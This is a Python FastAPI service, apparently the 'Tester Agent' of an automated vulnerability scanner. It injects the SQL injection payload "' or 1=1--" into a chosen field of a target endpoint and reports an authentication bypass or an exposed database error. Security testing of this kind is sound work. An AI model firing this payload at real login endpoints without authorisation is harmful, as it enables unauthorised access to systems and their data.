import httpx
from fastapi import FastAPI, HTTPException
from contract_schemas import DiscoveredEntryPoint, ValidationResponse

app = FastAPI(title="SECURE - Tester Agent (HTTP Direct)")

SQL_ERRORS = [
    "sql syntax", "sqlite_error", "sqliteerror", "unclosed quotation mark",
    "pg::error", "mysql_fetch", "oracle error", "syntax error in query"
]

@app.get("/")
def read_root():
    return {"status": "ok", "service": "tester-agent"}

@app.post("/validate", response_model=ValidationResponse)
async def validate_attack(contract: DiscoveredEntryPoint):
    print(f"[TESTER] Recibido contrato HTTP para: {contract.target_url}")
    
    vulnerable = False
    evidence = ""
    
    # Payload de prueba SQLi
    sqli_payload = "' or 1=1--"

    # Inyectar el payload en la plantilla capturada
    request_body = contract.payload_template.copy()
    request_body[contract.target_field] = sqli_payload
    
    # Llenar otros campos con valores dummy si están vacíos
    for key in request_body:
        if key != contract.target_field and not request_body[key]:
            request_body[key] = "dummyPass123"

    async with httpx.AsyncClient(timeout=10.0) as client:
        try:
            print(f"[TESTER] Enviando POST HTTP directo a {contract.target_url}")
            print(f"[TESTER] Body inyectado: {request_body}")

            response = await client.request(
                method=contract.http_method,
                url=contract.target_url,
                headers=contract.headers,
                json=request_body
            )

            res_text_lower = response.text.lower()

            # 1. Criterio A: Autenticación Exitosa (Bypass confirmada por Token JWT o Status 200 en Login)
            if response.status_code == 200 and ("token" in res_text_lower or "success" in res_text_lower or "authentication" in res_text_lower):
                vulnerable = True
                evidence = f"Bypass de autenticación exitoso a nivel HTTP. Status: {response.status_code}. Respuesta incluye token/sesión válida."

            # 2. Criterio B: Error de Base de Datos Expuesto (Error-Based SQLi)
            elif any(error in res_text_lower for error in SQL_ERRORS):
                vulnerable = True
                evidence = f"Inyección SQL confirmada. La API expuso un error de base de datos en la respuesta HTTP."

            else:
                evidence = f"La API respondió con Status {response.status_code}. No se detectó bypass ni errores SQL expuestos."

        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Error al realizar la petición HTTP de prueba: {str(e)}")

    return ValidationResponse(
        target_url=contract.target_url,
        vulnerable=vulnerable,
        payload_used=sqli_payload,
        details=evidence
    )